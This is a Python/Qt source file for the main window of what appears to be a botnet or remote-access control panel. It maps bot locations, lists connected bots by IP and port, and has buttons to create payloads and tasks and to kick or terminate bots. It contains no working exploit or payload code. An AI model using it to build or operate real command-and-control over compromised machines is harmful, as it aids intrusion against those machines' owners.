import os
import sys

from qtpy.QtWidgets import (QWidget, QHBoxLayout, QVBoxLayout, QPushButton, QTableView, QFrame, QAbstractItemView,
                            QTableWidget, QSizePolicy, QAbstractScrollArea, QHeaderView, QSplitter)
from qtpy.QtCore import QSize, Qt, Slot, QModelIndex, Signal
from qtpy.QtGui import QIcon

from qrainbowstyle.widgets import GoogleMapsView

from models import Bot, Log
from models.BotsTableModel import BotsTableModel
from view.MainWindow.Widgets import MainWindowButton


class MainWidget(QWidget):
    bot_double_clicked = Signal(Bot)
    task_button_clicked = Signal()
    payload_button_clicked = Signal()
    bot_clicked = Signal(int)
    load_finished = Signal()

    def __init__(self, parent):
        super(MainWidget, self).__init__(parent)
        self.main_layout = QHBoxLayout(self)
        self.main_layout.setSpacing(11)
        self.setLayout(self.main_layout)

    def setupUi(self, config):
        self.map = GoogleMapsView(self, config.get("gmaps_key"))
        self.map.getHandler().markerDoubleClicked.connect(lambda bot_id, lat, lng: self.bot_double_clicked.emit(
            self.table_model.getDeviceById(int(bot_id))))
        self.map.getHandler().markerClicked.connect(self.bot_clicked.emit)

        self.map.setObjectName("mapWidget")
        self.map.enableMarkersDragging(False)
        self.map.loadFinished.connect(self.load_finished.emit)

        self.bots_table = QTableView(self)
        self.bots_table.doubleClicked.connect(self.on_botTable_doubleClicked)
        self.bots_table.setObjectName("bots_table")
        self.bots_table.setAutoFillBackground(True)
        self.bots_table.setFrameShape(QFrame.StyledPanel)
        self.bots_table.setFrameShadow(QFrame.Sunken)
        self.bots_table.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self.bots_table.setHorizontalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self.bots_table.setSizeAdjustPolicy(QAbstractScrollArea.AdjustToContents)
        self.bots_table.setVerticalScrollMode(QAbstractItemView.ScrollPerPixel)
        self.bots_table.setHorizontalScrollMode(QAbstractItemView.ScrollPerPixel)
        self.bots_table.setGridStyle(Qt.SolidLine)
        self.bots_table.horizontalHeader().setStretchLastSection(True)
        self.bots_table.setContextMenuPolicy(Qt.CustomContextMenu)

        hheader = self.bots_table.horizontalHeader()
        hheader.setDefaultSectionSize(150)
        hheader.setMinimumSectionSize(150)
        hheader.setMouseTracking(True)

        vheader = self.bots_table.verticalHeader()
        vheader.setCascadingSectionResizes(True)
        vheader.setDefaultSectionSize(35)
        vheader.setSortIndicatorShown(False)
        vheader.setStretchLastSection(False)
        vheader.setVisible(False)

        self.bots_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.bots_table.setSelectionMode(QAbstractItemView.ExtendedSelection)
        self.bots_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table_model = BotsTableModel(self)
        self.table_model.setObjectName("table_model")
        self.table_model.removed.connect(self.map.deleteMarker)
        self.bots_table.setModel(self.table_model)

        for i in range(self.table_model.columnCount()):
            self.bots_table.horizontalHeader().setSectionResizeMode(i, QHeaderView.Stretch)

        self.splitter = QSplitter(self)
        self.splitter.addWidget(self.map)
        self.splitter.addWidget(self.bots_table)
        self.splitter.setOrientation(Qt.Vertical)

        self.main_layout.addWidget(self.splitter)

        sizepolicy = QSizePolicy(QSizePolicy.Minimum, QSizePolicy.Minimum)
        sizepolicy.setHorizontalStretch(0)
        sizepolicy.setVerticalStretch(0)

        self.buttons_widget = QWidget(self)
        self.buttons_widget.setContentsMargins(0, 0, 0, 0)
        self.buttons_widgetLayout = QVBoxLayout(self.buttons_widget)
        self.buttons_widgetLayout.setContentsMargins(0, 0, 0, 0)
        self.buttons_widgetLayout.setAlignment(Qt.AlignTop)
        self.buttons_widget.setLayout(self.buttons_widgetLayout)

        self.payload_button = MainWindowButton(self.buttons_widget)
        self.payload_button.setToolTip("Create payload")
        self.payload_button.clicked.connect(self.payload_button_clicked.emit)
        self.payload_button.setIcon(QIcon(os.path.join(os.getcwd(), "resources/icons/3d-cube-sphere.svg")))

        self.task_button = MainWindowButton(self.buttons_widget)
        self.task_button.setToolTip("Create tasks")
        self.task_button.clicked.connect(self.task_button_clicked.emit)
        self.task_button.setIcon(QIcon(os.path.join(os.getcwd(), "resources/icons/list-check.svg")))

        self.disconnect_button = MainWindowButton(self.buttons_widget)
        self.disconnect_button.setToolTip("Kick")
        self.disconnect_button.setIcon(QIcon(os.path.join(os.getcwd(), "resources/icons/wifi-off.svg")))

        self.terminate_button = MainWindowButton(self.buttons_widget)
        self.terminate_button.setToolTip("Terminate")
        self.terminate_button.setIcon(QIcon(os.path.join(os.getcwd(), "resources/icons/user-off.svg")))

        self.close_button = MainWindowButton(self.buttons_widget)
        self.close_button.setToolTip("Close")
        self.close_button.clicked.connect(self.window().closeClicked.emit)
        self.close_button.setIcon(QIcon(os.path.join(os.getcwd(), "resources/icons/x.svg")))

        self.buttons_widgetLayout.addWidget(self.payload_button)
        self.buttons_widgetLayout.addWidget(self.task_button)
        self.buttons_widgetLayout.addWidget(self.terminate_button)
        self.buttons_widgetLayout.addWidget(self.disconnect_button)
        self.buttons_widgetLayout.addStretch(1)
        self.buttons_widgetLayout.addWidget(self.close_button)

        self.main_layout.addWidget(self.buttons_widget)

    @Slot(QModelIndex)
    def on_botTable_doubleClicked(self, index: QModelIndex):
        self.bot_double_clicked.emit(self.table_model.getDeviceById(self.table_model.index(index.row(), 0).data()))

    def add_bot(self, bot_id, ip, port, kwargs={}):
        bot = Bot(None, bot_id, ip, port, **kwargs)
        bot.update_map.connect(lambda marker_id, loc: self.map.addMarker(marker_id, loc[0], loc[1]))
        self.table_model.appendDevice(bot)

    def update_bot(self, bot_id, kwargs):
        self.table_model.updateDevice(bot_id, kwargs)

    def remove_bot(self, bot_id):
        self.table_model.removeDevice(bot_id)

    @Slot(Log)
    def on_bot_log(self, log):
        bot = self.table_model.getDeviceById(log.device_id)
        if bot:
            bot.logs.append(log)
            bot.updated.emit()

    @Slot(int)
    def get_bot_by_id(self, bot_id):
        return self.table_model.getDeviceById(bot_id)
